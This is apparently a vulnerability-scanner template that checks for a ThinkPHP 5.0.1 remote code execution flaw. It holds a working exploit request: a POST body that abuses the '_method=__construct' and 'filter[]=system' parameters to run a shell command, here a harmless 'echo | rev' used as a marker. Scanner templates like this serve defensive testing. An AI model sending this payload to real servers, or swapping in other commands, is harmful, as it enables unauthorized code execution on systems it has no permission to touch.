id: thinkphp-501-rce
brief:
    title: ThinkPHP 5.0.1 - Remote Code Execution
    by: lark-lab
    level: critical
    about: ThinkPHP 5.0.1 allows remote unauthenticated attackers to  execute arbitrary code via the 's' parameter.
    label:
        - edb
        - thinkphp
        - rce
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/?s=index/index/index'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: s=echo%20thinkphp%20%7C%20rev&_method=__construct&method&filter[]=system
      signs:
        - "on": word
          has:
            - phpkniht
          in: body
          need: all
        - "on": status
          status:
            - 200
